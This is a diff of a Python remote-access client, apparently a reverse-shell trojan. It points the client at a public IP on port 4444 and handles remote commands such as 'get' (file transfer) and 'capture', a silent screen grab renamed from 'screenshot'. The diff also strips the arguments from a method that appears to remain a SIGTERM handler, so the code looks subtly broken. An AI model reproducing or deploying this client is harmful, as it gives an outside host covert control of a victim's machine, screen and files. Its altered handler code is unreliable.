@@ -20,7 +20,7 @@ queue = Queue()
 class Client(object):
 
     def __init__(self):
-        self.serverHost = 'localhost'
+        self.serverHost = '46.101.72.11'
         self.serverPort = 4444
         self.socket = None
 
@@ -29,7 +29,7 @@ class Client(object):
         signal.signal(signal.SIGTERM, self.quit_gracefully)
         return
 
-    def quit_gracefully(self, signal=None, frame=None):
+    def quit_gracefully(self):
         print('\nQuitting gracefully')
         if self.socket:
             try:
@@ -39,7 +39,6 @@ class Client(object):
                 print('Could not close connection %s' % str(e))
                 # continue
         sys.exit(0)
-        return
 
     def socket_create(self):
         """ Create a socket """
@@ -99,8 +98,8 @@ class Client(object):
                 break
             elif data[:].decode("850") == 'get':
                 self.get()
-            elif data[:].decode("850") == 'screenshot':
-                self.screenshot()
+            elif data[:].decode("850") == 'capture':
+                self.capture()
 
             elif len(data) > 0:
                 try:
@@ -142,7 +141,7 @@ class Client(object):
         filename = self.socket.recv(1024).decode("850")
         self.download(filename)
 
-    def screenshot(self):
+    def capture(self):
 
         filename = self.socket.recv(1024).decode("850")
         screen = ImageGrab.grab()
@@ -172,7 +171,6 @@ def work(server):
             server.socket_connect()
             server.receive_commands()
         queue.task_done()
-    return
 
 
 def create_jobs():
